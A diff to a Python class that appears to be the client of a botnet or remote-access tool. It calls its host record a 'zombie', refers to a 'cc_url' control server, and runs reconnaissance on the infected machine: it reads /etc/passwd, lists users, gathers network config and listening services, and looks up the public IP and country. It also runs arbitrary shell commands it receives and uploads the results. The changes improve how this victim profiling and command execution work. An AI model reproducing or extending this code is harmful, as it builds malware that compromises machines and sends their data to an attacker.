@@ -14,9 +14,13 @@ class Machine:
         self.output = None
         self.cwd = config.APP_DIR
         self.info = {
+            'current_user': '',
+            'human_users': '',
+            'users_online': '',
+            'all_users': '',
+            'private_ip': '',
             'public_ip': '',
             'country': '',
-            'private_ip': '',
             'hostname': '',
             'os': '',
             'os_details': '',
@@ -27,10 +31,6 @@ class Machine:
             'n_processors': '',
             'memory': '',
             'drives_usage': '',
-            'current_user': '',
-            'human_users': '',
-            'users_online': '',
-            'all_users': '',
             'netconfig': '',
             'svc_listen': '',
             'chipset_pci_bus': ''
@@ -40,10 +40,10 @@ class Machine:
         temp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         try:
             temp_socket.connect(('10.255.255.255', 0))
-            self.info['public_ip'] = temp_socket.getsockname()[0]
-            return self.info['public_ip']
+            self.info['private_ip'] = temp_socket.getsockname()[0]
+            return self.info['private_ip']
         except:
-            self.info['public_ip'] = '127.0.0.1'
+            self.info['private_ip'] = '127.0.0.1'
             return False
         finally:
             temp_socket.close()
@@ -53,6 +53,7 @@ class Machine:
             data = http_client.post_json('https://api.myip.com/')
             if data:
                 self.info['public_ip'] = data['ip']
+                #self.info['public_ip'] = "8.8.8.8"      # testing purposes
                 self.info['country'] = data['cc']
                 return self.info['public_ip'], self.info['country']
             return False
@@ -122,11 +123,12 @@ class Machine:
             self.info['manufacturer'] = my_system.Manufacturer
             self.info['model'] = my_system.Model
             self.info['memory'] = self.execute_comand("wmic MemoryChip get BankLabel, Capacity, MemoryType, TypeDetail, Speed")
-            self.info['cpu'] = self.execute_comand("wmic CPU get NAME")
-            self.info["n_processors"] = my_system.NumberOfProcessors
+            self.info['cpu'] = self.execute_comand("wmic CPU get NAME").strip("Name , ,")
+            self.info["n_processors"] = str(my_system.NumberOfProcessors)
             self.info["drives_usage"] = self.execute_comand("wmic logicaldisk get size, freespace, caption")
             self.info["netconfig"] = self.execute_comand("ipconfig /all")
-            self.info["svc_listen"] = self.execute_comand("ss -tlnp")
+            self.info["svc_listen"] = self.execute_comand("netstat -ao")
+            #self.info["tracert_to_cc"] = self.execute_comand("tracert {}".format(config.credentials["cc_url"].split("http://")[0].split("https://")[0]).split(":")[0].split("/")[0])
 
         # android data
         elif platform.system() == "Linux":
@@ -149,6 +151,7 @@ class Machine:
                 self.info["all_users"] = self.execute_comand("cat /etc/passwd")
                 self.info["netconfig"] = self.execute_comand("ip addr")
                 self.info["svc_listen"] = self.execute_comand("ss -tlnp")
+                #self.info["tracert_to_cc"] = self.execute_comand("traceroute {}".format(config.credentials["cc_url"].split("http://")[0].split("https://")[0]).split(":")[0].split("/")[0])
                 self.info['chipset_pci_bus'] = self.execute_comand("lspci")
 
         # ios data
@@ -168,15 +171,17 @@ class Machine:
         try:
             if crud.update_data('zombie', data):
                 logger.log('OS info updated', 'SUCCESS')
+                return True
         except Exception as e:
             logger.log(e, 'ERROR')
             logger.log('error trying to update OS info', 'ERROR')
-            pass
+            return False
 
     def startup_tasks(self):
         # refresh os info only one time per session
         logger.log('executing startup tasks...', 'OTHER')
-        self.upload_system_info()
+        if self.upload_system_info():
+            return True
 
     def autorecon(self):
         logger.log('starting autorecon module...', 'OTHER')
@@ -208,10 +213,13 @@ class Machine:
 
             # execute command
             else:
-                self.output = check_output(command, stderr=STDOUT, timeout=timeout, shell=True)
-                if self.output:
-                    self.output = self.output.decode("utf-8")
-                else:
+                self.output = check_output(command, stderr=STDOUT, timeout=timeout, shell=True, universal_newlines=True)
+                # if self.output:
+                #     try:
+                #         self.output = self.output.decode("utf-8")
+                # else:
+                #     self.output = ' '
+                if not self.output:
                     self.output = ' '
 
             #after every command, change dir to app base directory
@@ -222,4 +230,12 @@ class Machine:
             return self.output
 
         except CalledProcessError as e:
-            return e.output.decode("utf-8")
+            try:
+                return e.output.decode("utf-8")
+            except:
+                try:
+                    return e.output
+                except:
+                    logger.log("type: {}, value: {}".format(type(self.output), self.output), 'ERROR')
+                    pass
+                    #self.output = self.output.decode("ascii")
